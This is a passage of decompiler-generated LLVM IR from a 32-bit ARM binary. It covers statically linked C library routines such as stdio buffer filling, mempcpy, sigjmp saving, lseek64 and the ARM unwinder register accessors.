  %v3_18f88 = phi i32 [ %v5_18fa0, %dec_label_pc_1902cthread-pre-split.dec_label_pc_18f84_crit_edge ], [ %arg3, %entry ]
  %v0_18f88 = icmp slt i32 %v0_18f88.in, 0
  %storemerge = select i1 %v0_18f88, i32 %v3_18f84, i32 %v3_18f88
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_18f8c, i32* %r1.global-to-local, align 4
  %v1_18f90 = add i32 %v0_18f90, 4
  %v2_18f90 = inttoptr i32 %v1_18f90 to i32*
  %v3_18f90 = load i32, i32* %v2_18f90, align 4
  %v3_18f94 = call i32 @__GI___libc_write(i32 %v3_18f90, i32 %v0_18f8c)
  %v1_18f98 = icmp slt i32 %v3_18f94, 0
  %v2_18f98 = icmp eq i32 %v3_18f94, 0
  store i1 %v2_18f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18f98, label %dec_label_pc_18fa8, label %dec_label_pc_1902cthread-pre-split

dec_label_pc_18fa8:                               ; preds = %dec_label_pc_18f84
  %v0_18fa8 = load i32, i32* @r4, align 4
  %v1_18fa8 = inttoptr i32 %v0_18fa8 to i16*
  %v2_18fa8 = load i16, i16* %v1_18fa8, align 2
  %v1_18fac = or i16 %v2_18fa8, 8
  store i16 %v1_18fac, i16* %v1_18fa8, align 2
  store i32 42080, i32* %r3.global-to-local, align 4
  %v0_18fb8 = call i32 @__aeabi_read_tp()
  %v3_18fbc = load i16, i16* @global_var_23424.488, align 2
  %v4_18fbc = sext i16 %v3_18fbc to i32
  store i32 %v4_18fbc, i32* %r3.global-to-local, align 4
  %v2_18fc0 = add i32 %v4_18fbc, %v0_18fb8
  %v3_18fc0 = inttoptr i32 %v2_18fc0 to i32*
  %v4_18fc0 = load i32, i32* %v3_18fc0, align 4
  store i32 %v4_18fc0, i32* %r3.global-to-local, align 4
  %v7_18fc4 = icmp eq i32 %v4_18fc0, 4
  store i1 %v7_18fc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18fc4, label %dec_label_pc_18fd0, label %bb21

bb21:                                             ; preds = %dec_label_pc_18fa8
  %v8_18fc8 = icmp eq i32 %v4_18fc0, 11
  store i1 %v8_18fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18fc8, label %dec_label_pc_18fd0, label %dec_label_pc_19034

dec_label_pc_18fd0:                               ; preds = %dec_label_pc_18fa8, %bb21
  %v0_18fd0 = load i32, i32* @r4, align 4
  %v1_18fd0 = add i32 %v0_18fd0, 8
  store i32 %v1_18fd0, i32* %r2.global-to-local, align 4
  %v1_18fd4 = inttoptr i32 %v1_18fd0 to i32*
  %v2_18fd4 = load i32, i32* %v1_18fd4, align 4
  store i32 %v2_18fd4, i32* %r2.global-to-local, align 4
  %v3_18fd4 = add i32 %v0_18fd0, 12
  %v4_18fd4 = inttoptr i32 %v3_18fd4 to i32*
  %v5_18fd4 = load i32, i32* %v4_18fd4, align 4
  store i32 %v5_18fd4, i32* %r3.global-to-local, align 4
  %v2_18fd8 = sub i32 %v5_18fd4, %v2_18fd4
  store i32 %v2_18fd8, i32* %r1.global-to-local, align 4
  %v9_18fd8 = icmp eq i32 %v5_18fd4, %v2_18fd4
  store i1 %v9_18fd8, i1* %cpsr_z.global-to-local, align 1
  %v0_19024.pre = load i32, i32* @r5, align 4
  br i1 %v9_18fd8, label %dec_label_pc_19024, label %dec_label_pc_18fe0

dec_label_pc_18fe0:                               ; preds = %dec_label_pc_18fd0
  %v3_18fe0 = icmp ult i32 %v2_18fd8, %v0_19024.pre
  %v9_18fe0 = icmp eq i32 %v2_18fd8, %v0_19024.pre
  store i1 %v9_18fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18fe0, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_18fe0
  store i32 %v0_19024.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_18fe0, %bb22, %dec_label_pc_19008
  %v2_18ff4 = phi i32 [ %v1_1900c, %dec_label_pc_19008 ], [ %v2_18fd4, %bb22 ], [ %v2_18fd4, %dec_label_pc_18fe0 ]
  %v0_18fe8 = load i32, i32* @r6, align 4
  %v1_18fe8 = inttoptr i32 %v0_18fe8 to i8*
  %v2_18fe8 = load i8, i8* %v1_18fe8, align 1
  %v3_18fe8 = zext i8 %v2_18fe8 to i32
  store i32 %v3_18fe8, i32* %r3.global-to-local, align 4
  %v7_18fec = icmp eq i8 %v2_18fe8, 10
  store i1 %v7_18fec, i1* %cpsr_z.global-to-local, align 1
  %v1_18ff0 = add i32 %v0_18fe8, 1
  store i32 %v1_18ff0, i32* @r6, align 4
  %v3_18ff4 = inttoptr i32 %v2_18ff4 to i8*
  store i8 %v2_18fe8, i8* %v3_18ff4, align 1
  %v0_18ff8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18ff8, label %dec_label_pc_18ffc, label %dec_label_pc_19008

dec_label_pc_18ffc:                               ; preds = %.preheader
  %v0_18ffc = load i32, i32* @r4, align 4
  %v1_18ffc = inttoptr i32 %v0_18ffc to i16*
  %v2_18ffc = load i16, i16* %v1_18ffc, align 2
  %v3_18ffc = zext i16 %v2_18ffc to i32
  store i32 %v3_18ffc, i32* %r3.global-to-local, align 4
  %v1_19000 = and i32 %v3_18ffc, 256
  %v2_19000 = icmp eq i32 %v1_19000, 0
  store i1 %v2_19000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19000, label %dec_label_pc_19008, label %dec_label_pc_18ffc.dec_label_pc_19014_crit_edge

dec_label_pc_18ffc.dec_label_pc_19014_crit_edge:  ; preds = %dec_label_pc_18ffc
  %v0_19018.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19014

dec_label_pc_19008:                               ; preds = %dec_label_pc_18ffc, %.preheader
  %v0_19008 = load i32, i32* %r1.global-to-local, align 4
  %v1_19008 = add i32 %v0_19008, -1
  store i32 %v1_19008, i32* %r1.global-to-local, align 4
  %v7_19008 = icmp eq i32 %v0_19008, 1
  store i1 %v7_19008, i1* %cpsr_z.global-to-local, align 1
  %v0_1900c = load i32, i32* %r2.global-to-local, align 4
  %v1_1900c = add i32 %v0_1900c, 1
  store i32 %v1_1900c, i32* %r2.global-to-local, align 4
  br i1 %v7_19008, label %dec_label_pc_19008.dec_label_pc_19014_crit_edge, label %.preheader

dec_label_pc_19008.dec_label_pc_19014_crit_edge:  ; preds = %dec_label_pc_19008
  %v0_19014.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19014

dec_label_pc_19014:                               ; preds = %dec_label_pc_18ffc.dec_label_pc_19014_crit_edge, %dec_label_pc_19008.dec_label_pc_19014_crit_edge
  %v0_19018 = phi i32 [ %v1_1900c, %dec_label_pc_19008.dec_label_pc_19014_crit_edge ], [ %v0_19018.pre, %dec_label_pc_18ffc.dec_label_pc_19014_crit_edge ]
  %v0_19014 = phi i32 [ %v0_19014.pre, %dec_label_pc_19008.dec_label_pc_19014_crit_edge ], [ %v0_18ffc, %dec_label_pc_18ffc.dec_label_pc_19014_crit_edge ]
  %v1_19014 = add i32 %v0_19014, 8
  %v2_19014 = inttoptr i32 %v1_19014 to i32*
  %v3_19014 = load i32, i32* %v2_19014, align 4
  store i32 %v3_19014, i32* %r3.global-to-local, align 4
  %v2_19018 = add i32 %v0_19014, 16
  %v3_19018 = inttoptr i32 %v2_19018 to i32*
  store i32 %v0_19018, i32* %v3_19018, align 4
  %v0_1901c = load i32, i32* %r3.global-to-local, align 4
  %v1_1901c = load i32, i32* %r2.global-to-local, align 4
  %v2_1901c = sub i32 %v1_1901c, %v0_1901c
  store i32 %v2_1901c, i32* %r3.global-to-local, align 4
  %v1_19020 = load i32, i32* @r5, align 4
  %v2_19020 = sub i32 %v1_19020, %v2_1901c
  br label %dec_label_pc_19024

dec_label_pc_19024:                               ; preds = %dec_label_pc_18fd0, %dec_label_pc_19014
  %v0_19024 = phi i32 [ %v2_19020, %dec_label_pc_19014 ], [ %v0_19024.pre, %dec_label_pc_18fd0 ]
  %v1_19024 = load i32, i32* @r7, align 4
  %v2_19024 = sub i32 %v1_19024, %v0_19024
  store i32 %v2_19024, i32* @r7, align 4
  br label %dec_label_pc_19034

dec_label_pc_1902cthread-pre-split:               ; preds = %dec_label_pc_18f84
  %v3_18f9c = load i32, i32* @r6, align 4
  %v5_18f9c = add i32 %v3_18f9c, %v3_18f94
  store i32 %v5_18f9c, i32* @r6, align 4
  %v4_18fa0 = load i32, i32* @r5, align 4
  %v5_18fa0 = sub i32 %v4_18fa0, %v3_18f94
  store i32 %v5_18fa0, i32* @r5, align 4
  %v2_1902c = icmp eq i32 %v5_18fa0, 0
  store i1 %v2_1902c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1902c, label %dec_label_pc_19034, label %dec_label_pc_1902cthread-pre-split.dec_label_pc_18f84_crit_edge

dec_label_pc_1902cthread-pre-split.dec_label_pc_18f84_crit_edge: ; preds = %dec_label_pc_1902cthread-pre-split
  %v3_18f84.pre = load i32, i32* @r8, align 4
  %v0_18f90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18f84

dec_label_pc_19034:                               ; preds = %dec_label_pc_1902cthread-pre-split, %entry, %bb21, %dec_label_pc_19024
  %v0_19034 = load i32, i32* @r7, align 4
  ret i32 %v0_19034

; uselistorder directives
  uselistorder i32 %v5_18fa0, { 1, 3, 0, 2 }
  uselistorder i32 %v5_18f9c, { 1, 0 }
  uselistorder i32 %v0_19014, { 1, 0 }
  uselistorder i32 %v1_1900c, { 0, 2, 1 }
  uselistorder i32 %v0_19008, { 1, 0 }
  uselistorder i32 %v0_19024.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_18fd4, { 1, 0, 2 }
  uselistorder i32 %v2_18fd4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_18f94, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18f8c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 4, 5, 0, 6, 1, 2, 3 }
  uselistorder i32 11, { 10, 7, 8, 9, 18, 24, 26, 0, 11, 12, 13, 14, 2, 15, 16, 17, 19, 20, 3, 21, 4, 22, 1, 23, 25, 5, 27, 28, 29, 6, 30 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_19034, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_19024, { 1, 0 }
  uselistorder label %dec_label_pc_19014, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18fd0, { 1, 0 }
  uselistorder label %dec_label_pc_18f84, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19044 = load i32, i32* @r4, align 4
  store i32 %v3_19044, i32* %stack_var_-8, align 4
  %v1_19048 = add i32 %arg1, 8
  %v1_1904c = inttoptr i32 %v1_19048 to i32*
  %v2_1904c = load i32, i32* %v1_1904c, align 4
  store i32 %v2_1904c, i32* @r1, align 4
  %v3_1904c = add i32 %arg1, 12
  %v4_1904c = inttoptr i32 %v3_1904c to i32*
  %v5_1904c = load i32, i32* %v4_1904c, align 4
  %v2_19050 = sub i32 %v5_1904c, %v2_1904c
  store i32 %v2_19050, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19058 = inttoptr i32 %arg1 to i16*
  %v4_19058 = call i32 @__stdio_READ(i16* %v3_19058, i32 %v2_1904c, i32 %v2_19050)
  %v0_1905c = load i32, i32* @r4, align 4
  %v1_1905c = add i32 %v0_1905c, 8
  %v2_1905c = inttoptr i32 %v1_1905c to i32*
  %v3_1905c = load i32, i32* %v2_1905c, align 4
  store i32 %v3_1905c, i32* %r2.global-to-local, align 4
  %v2_19060 = add i32 %v3_1905c, %v4_19058
  %v2_19064 = add i32 %v0_1905c, 20
  %v3_19064 = inttoptr i32 %v2_19064 to i32*
  store i32 %v2_19060, i32* %v3_19064, align 4
  %v0_19068 = load i32, i32* %r2.global-to-local, align 4
  %v1_19068 = load i32, i32* @r4, align 4
  %v2_19068 = add i32 %v1_19068, 16
  %v3_19068 = inttoptr i32 %v2_19068 to i32*
  store i32 %v0_19068, i32* %v3_19068, align 4
  %v2_1906c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1906c, i32* @r4, align 4
  ret i32 %v4_19058

; uselistorder directives
  uselistorder i32 %v4_19058, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19074 = load i32, i32* @r4, align 4
  store i32 %v3_19074, i32* %stack_var_-12, align 4
  %v0_19078 = load i32, i32* @r0, align 4
  %v1_19078 = inttoptr i32 %v0_19078 to i16*
  %v2_19078 = load i16, i16* %v1_19078, align 2
  %v3_19078 = zext i16 %v2_19078 to i32
  store i32 %v3_19078, i32* %r3.global-to-local, align 4
  %v0_1907c = load i32, i32* @r1, align 4
  %v2_1907c = and i32 %v0_1907c, %v3_19078
  %v4_1907c = icmp eq i32 %v2_1907c, 0
  store i32 %v0_19078, i32* @r4, align 4
  br i1 %v4_1907c, label %dec_label_pc_1908c, label %dec_label_pc_1909c

dec_label_pc_1908c:                               ; preds = %entry
  %v1_1908c = and i32 %v3_19078, 2176
  %v2_1908c = icmp eq i32 %v1_1908c, 0
  br i1 %v2_1908c, label %dec_label_pc_19094, label %dec_label_pc_190a8

dec_label_pc_19094:                               ; preds = %dec_label_pc_1908c
  %v2_19094 = or i32 %v0_1907c, %v3_19078
  store i32 %v2_19094, i32* %r3.global-to-local, align 4
  %v1_19098 = trunc i32 %v2_19094 to i16
  store i16 %v1_19098, i16* %v1_19078, align 2
  %v0_1909c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1909c

dec_label_pc_1909c:                               ; preds = %entry, %dec_label_pc_19094
  %v0_1909c = phi i32 [ %v0_19078, %entry ], [ %v0_1909c.pre, %dec_label_pc_19094 ]
  %v1_1909c = inttoptr i32 %v0_1909c to i16*
  %v2_1909c = load i16, i16* %v1_1909c, align 2
  %v3_1909c = zext i16 %v2_1909c to i32
  store i32 %v3_1909c, i32* %r3.global-to-local, align 4
  %v1_190a0 = and i32 %v3_1909c, 16
  store i32 %v1_190a0, i32* %r5.global-to-local, align 4
  %v2_190a0 = icmp eq i32 %v1_190a0, 0
  br i1 %v2_190a0, label %dec_label_pc_190d0, label %dec_label_pc_190a8

dec_label_pc_190a8:                               ; preds = %dec_label_pc_1908c, %dec_label_pc_1909c
  store i32 41836, i32* %r3.global-to-local, align 4
  %v0_190ac = call i32 @__aeabi_read_tp()
  store i32 %v0_190ac, i32* %r0.global-to-local, align 4
  %v3_190b0 = load i16, i16* @global_var_23424.488, align 2
  %v4_190b0 = sext i16 %v3_190b0 to i32
  store i32 %v4_190b0, i32* %r3.global-to-local, align 4
  %v3_190b8 = add i32 %v4_190b0, %v0_190ac
  %v4_190b8 = inttoptr i32 %v3_190b8 to i32*
  store i32 9, i32* %v4_190b8, align 4
  br label %dec_label_pc_190bc

dec_label_pc_190bc:                               ; preds = %dec_label_pc_190d8, %dec_label_pc_190a8
  %v0_190bc = load i32, i32* @r4, align 4
  %v1_190bc = inttoptr i32 %v0_190bc to i16*
  %v2_190bc = load i16, i16* %v1_190bc, align 2
  %v3_190bc = zext i16 %v2_190bc to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_190c4 = or i32 %v3_190bc, 8
  store i32 %v1_190c4, i32* %r3.global-to-local, align 4
  %v1_190c8 = trunc i32 %v1_190c4 to i16
  store i16 %v1_190c8, i16* %v1_190bc, align 2
  %v1_19110.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19108

dec_label_pc_190d0:                               ; preds = %dec_label_pc_1909c
  %v1_190d0 = and i32 %v3_1909c, 64
  %v2_190d0 = icmp eq i32 %v1_190d0, 0
  br i1 %v2_190d0, label %dec_label_pc_190f8, label %dec_label_pc_190d8

dec_label_pc_190d8:                               ; preds = %dec_label_pc_190d0
  %v0_190d8 = load i32, i32* @r0, align 4
  %v1_190d8 = call i32 @__stdio_wcommit(i32 %v0_190d8)
  store i32 %v1_190d8, i32* %r0.global-to-local, align 4
  %v2_190dc = icmp eq i32 %v1_190d8, 0
  br i1 %v2_190dc, label %dec_label_pc_190e4, label %dec_label_pc_190bc

dec_label_pc_190e4:                               ; preds = %dec_label_pc_190d8
  %v0_190e4 = load i32, i32* @r4, align 4
  %v1_190e4 = inttoptr i32 %v0_190e4 to i16*
  %v2_190e4 = load i16, i16* %v1_190e4, align 2
  %v3_190e4 = zext i16 %v2_190e4 to i32
  store i32 %v3_190e4, i32* %r3.global-to-local, align 4
  %v1_190e8 = add i32 %v0_190e4, 8
  %v2_190e8 = inttoptr i32 %v1_190e8 to i32*
  %v3_190e8 = load i32, i32* %v2_190e8, align 4
  %v1_190ec = and i32 %v3_190e4, 65471
  store i32 %v1_190ec, i32* %r3.global-to-local, align 4
  %v2_190f0 = add i32 %v0_190e4, 28
  %v3_190f0 = inttoptr i32 %v2_190f0 to i32*
  store i32 %v3_190e8, i32* %v3_190f0, align 4
  %v0_190f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_190f4 = trunc i32 %v0_190f4 to i16
  %v2_190f4 = load i32, i32* @r4, align 4
  %v3_190f4 = inttoptr i32 %v2_190f4 to i16*
  store i16 %v1_190f4, i16* %v3_190f4, align 2
  %v0_190f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_190f8

dec_label_pc_190f8:                               ; preds = %dec_label_pc_190d0, %dec_label_pc_190e4
  %v2_19100 = phi i32 [ %v0_1909c, %dec_label_pc_190d0 ], [ %v0_190f8.pre, %dec_label_pc_190e4 ]
  %v1_190f8 = inttoptr i32 %v2_19100 to i16*
  %v2_190f8 = load i16, i16* %v1_190f8, align 2
  %v3_190f8 = zext i16 %v2_190f8 to i32
  %v1_190fc = or i32 %v3_190f8, 1
  store i32 %v1_190fc, i32* %r3.global-to-local, align 4
  %v1_19100 = trunc i32 %v1_190fc to i16
  store i16 %v1_19100, i16* %v1_190f8, align 2
  %v0_19104 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19104, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19108

dec_label_pc_19108:                               ; preds = %dec_label_pc_190bc, %dec_label_pc_190f8
  %v1_19110 = phi i32 [ %v1_19110.pre, %dec_label_pc_190bc ], [ %v0_19104, %dec_label_pc_190f8 ]
  %v2_1910c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1910c, i32* @r4, align 4
  ret i32 %v1_19110

; uselistorder directives
  uselistorder i32 %v3_19078, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19108, { 1, 0 }
  uselistorder label %dec_label_pc_190f8, { 1, 0 }
  uselistorder label %dec_label_pc_190a8, { 1, 0 }
  uselistorder label %dec_label_pc_1909c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_19118 = load i32, i32* @r4, align 4
  %v6_19118 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_19128 = call i32 @memcpy()
  %v0_1912c = load i32, i32* @r5, align 4
  %v1_1912c = load i32, i32* @r4, align 4
  %v2_1912c = add i32 %v1_1912c, %v0_1912c
  store i32 %v3_19118, i32* @r4, align 4
  store i32 %v6_19118, i32* @r5, align 4
  ret i32 %v2_1912c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_1913c = load i32, i32* @r1, align 4
  %v2_1913c = icmp eq i32 %v0_1913c, 0
  %v3_19140 = load i32, i32* @r4, align 4
  store i32 %v3_19140, i32* %stack_var_-8, align 4
  %v0_19144 = load i32, i32* @r0, align 4
  store i32 %v0_19144, i32* %r4.global-to-local, align 4
  br i1 %v2_1913c, label %dec_label_pc_19168, label %dec_label_pc_1914c

dec_label_pc_1914c:                               ; preds = %entry
  %v1_19154 = add i32 %v0_19144, 260
  %v4_19158 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_19154)
  %v2_1915c = icmp eq i32 %v4_19158, 0
  br i1 %v2_1915c, label %dec_label_pc_1916c, label %dec_label_pc_19168

dec_label_pc_19168:                               ; preds = %dec_label_pc_1914c, %entry
  br label %dec_label_pc_1916c

dec_label_pc_1916c:                               ; preds = %dec_label_pc_1914c, %dec_label_pc_19168
  %storemerge = phi i32 [ 0, %dec_label_pc_19168 ], [ 1, %dec_label_pc_1914c ]
  %v1_19170 = load i32, i32* %r4.global-to-local, align 4
  %v2_19170 = add i32 %v1_19170, 256
  %v3_19170 = inttoptr i32 %v2_19170 to i32*
  store i32 %storemerge, i32* %v3_19170, align 4
  %v2_19174 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19174, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 2, 1, 0 }
  uselistorder i32* null, { 11, 0, 4, 5, 1, 6, 7, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 8, 27, 28, 29, 30, 31, 3, 32, 33, 34, 37, 35, 36, 50, 38, 10, 39, 40, 41, 42, 43, 44, 45, 46, 47, 9, 48, 49 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1916c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_191c4, label %dec_label_pc_191a8

dec_label_pc_191a8:                               ; preds = %entry
  %v0_191ac = call i32 @__aeabi_read_tp()
  %v3_191b0 = load i16, i16* @global_var_23424.488, align 2
  %v4_191b0 = sext i16 %v3_191b0 to i32
  %v0_191b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_191b4 = sub i32 0, %v0_191b4
  store i32 %v1_191b4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_191bc = add i32 %v4_191b0, %v0_191ac
  %v4_191bc = inttoptr i32 %v3_191bc to i32*
  store i32 %v1_191b4, i32* %v4_191bc, align 4
  %v0_191cc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_191cc

dec_label_pc_191c4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_191c4 = icmp eq i32 %arg1, 0
  br i1 %v2_191c4, label %dec_label_pc_191d8, label %dec_label_pc_191cc

dec_label_pc_191cc:                               ; preds = %dec_label_pc_191c4, %dec_label_pc_191a8
  %v0_191cc = phi i32 [ %arg1, %dec_label_pc_191c4 ], [ %v0_191cc.pre, %dec_label_pc_191a8 ]
  %v3_191d0 = ashr i32 %v0_191cc, 31
  br label %dec_label_pc_191dc

dec_label_pc_191d8:                               ; preds = %dec_label_pc_191c4
  br label %dec_label_pc_191dc

dec_label_pc_191dc:                               ; preds = %dec_label_pc_191cc, %dec_label_pc_191d8
  %v1_191e4 = phi i32 [ %v0_191cc, %dec_label_pc_191cc ], [ %tmp8, %dec_label_pc_191d8 ]
  %storemerge = phi i32 [ %v3_191d0, %dec_label_pc_191cc ], [ %tmp, %dec_label_pc_191d8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_191e4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 9, 4, 5, 11, 0, 6, 1, 7, 2, 8, 10, 3 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_23424.488, { 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 62, 68, 67, 61, 60, 77, 76, 65, 66, 64, 63, 75, 74, 73, 72, 71, 70, 69, 31, 30, 33, 29, 59, 46, 45, 12, 6, 5, 11, 28, 27, 10, 3, 2, 15, 9, 8, 7, 56, 32, 14, 13, 24, 26, 25, 55, 54, 23, 22, 34, 21, 35, 20, 47, 19, 53, 18, 36, 52, 17, 58, 57, 44, 41, 40, 39, 4, 51, 16, 38, 50, 37, 49, 48, 0, 1, 43, 42 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_191dc, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_191ec = icmp eq i32 %regclass, 0
  br i1 %v2_191ec, label %dec_label_pc_191f4, label %dec_label_pc_19224

dec_label_pc_191f4:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_191f4
  %v6_191f8 = icmp eq i32 %representation, 0
  br i1 %v6_191f8, label %dec_label_pc_19208, label %bb8

.thread3:                                         ; preds = %dec_label_pc_191f4
  br label %dec_label_pc_19230

bb8:                                              ; preds = %bb
  br label %dec_label_pc_19230

dec_label_pc_19208:                               ; preds = %bb
  %v3_19208 = mul i32 %regno, 4
  %v2_1920c = add i32 %v3_19208, %context
  %v1_19210 = add i32 %v2_1920c, 4
  %v2_19210 = inttoptr i32 %v1_19210 to i32*
  %v3_19210 = load i32, i32* %v2_19210, align 4
  %v2_1921c = bitcast i8* %valuep to i32*
  store i32 %v3_19210, i32* %v2_1921c, align 4
  ret i32 0

dec_label_pc_19224:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19224
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19224, %bb9
  %v0_1922c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_1922c)
  br label %dec_label_pc_19230

dec_label_pc_19230:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_19230, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_19238 = icmp eq i32 %regclass, 0
  br i1 %v2_19238, label %dec_label_pc_19240, label %dec_label_pc_19270

dec_label_pc_19240:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19240
  %v6_19244 = icmp eq i32 %representation, 0
  br i1 %v6_19244, label %dec_label_pc_19254, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19240
  br label %dec_label_pc_1927c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1927c

dec_label_pc_19254:                               ; preds = %bb
  %v3_19258 = mul i32 %regno, 4
  %v1_1925c = bitcast i8* %valuep to i32*
  %v2_1925c = load i32, i32* %v1_1925c, align 4
  %v2_19260 = add i32 %v3_19258, %context
  %v2_19268 = add i32 %v2_19260, 4
  %v3_19268 = inttoptr i32 %v2_19268 to i32*
  store i32 %v2_1925c, i32* %v3_19268, align 4
  ret i32 0

dec_label_pc_19270:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19270
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19270, %bb9
  %v0_19278 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_19278)
  br label %dec_label_pc_1927c

dec_label_pc_1927c:                               ; preds = %bb8, %.thread3, %bb10
